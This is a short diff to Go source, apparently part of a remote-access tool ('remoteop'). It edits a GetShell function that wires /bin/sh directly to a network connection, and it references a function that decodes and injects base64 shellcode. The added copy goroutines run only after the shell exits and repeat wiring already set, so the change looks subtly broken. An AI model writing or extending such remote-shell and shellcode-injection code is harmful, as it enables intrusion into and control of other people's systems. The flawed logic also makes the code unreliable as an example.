@@ -4,19 +4,32 @@ package remoteop
 
 import (
 	"encoding/base64"
+	"io"
+	"log"
 	"net"
 	"os/exec"
 	"golang.org/x/sys/unix"
 	"unsafe"
 )
 
-// GetShell returns an *exec.Cmd instance which will run /bin/bash
+// GetShell returns an *exec.Cmd instance which will run /bin/sh
 func GetShell(conn net.Conn) {
 	cmd := exec.Command("/bin/sh")
+	cmd.Stderr = conn
 	cmd.Stdout = conn
 	cmd.Stdin = conn
-	cmd.Stderr = conn
 	_ = cmd.Run()
+
+	copydata := func(r io.Reader, w io.Writer) {
+		_, err := io.Copy(w, r)
+		if err != nil {
+			log.Println(err)
+		}
+	}
+
+	go copydata(cmd.Stdin, conn)
+	go copydata(conn, cmd.Stdout)
+	go copydata(conn, cmd.Stderr)
 }
 
 // InjectShellcode decodes base64 encoded shellcode
